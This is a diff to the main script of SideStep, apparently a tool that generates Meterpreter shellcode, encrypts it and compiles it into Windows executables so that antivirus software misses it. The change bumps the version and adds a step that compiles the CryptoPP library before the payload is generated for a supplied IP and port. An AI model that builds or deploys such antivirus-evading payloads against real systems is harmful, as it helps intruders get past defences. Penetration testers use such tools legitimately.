@@ -1,6 +1,6 @@
 """
 Name:           SideStep
-Version:        0.1.1
+Version:        0.2.0
 Date:           3/30/2015
 Author:         Josh Berry - josh.berry@codewatch.org
 Github:         https://github.com/codewatchorg/sidestep
@@ -19,7 +19,7 @@ ditto (if you want to use it - https://github.com/mubix/ditto)
 Mono (if you want to sign the executable - http://www.mono-project.com/download/)
 
 Configuration Requirements:
-Ruby, Python, strip.exe (if using it), and the cl.exe tool from Visual Studio need to be in your path.  Sorry, I tried to make it compile with mingw-gcc with no luck.
+Ruby, Python, strip.exe (if using it), and the cl.exe and lib.exe tools from Visual Studio need to be in your path.  Sorry, I tried to make it compile with mingw-gcc with no luck.
 
 I leveraged ideas from the following projects to help develop this tool:
 - https://github.com/nccgroup/metasploitavevasion
@@ -41,6 +41,7 @@ from libs import rng
 from libs import encryption
 from libs import msfpayload
 from libs import codesegments
+from libs import cryptopp
 
 def main(argv):
   # Build argument list for running the script
@@ -110,6 +111,9 @@ def main(argv):
   diffieMsg1 = rng.genData(settings.dataLen)
   diffieMsg2 = rng.genData(settings.dataLen)
   curTimeVar = rng.genVar(settings.randomVarSize)
+
+  print '[-]\tCompiling CryptoPP library'
+  cryptopp.compileCryptoPP(path_delim, settings.sourceDir, settings.vsPath, settings.sdkPath, settings.kitPathIncl)
 
   print '[-]\tGenerating the Meterpreter shellcode'
   clearPayload = msfpayload.payloadGenerator(settings.msfpath, settings.msfvenom, settings.msfmeterpreter, ip, port)
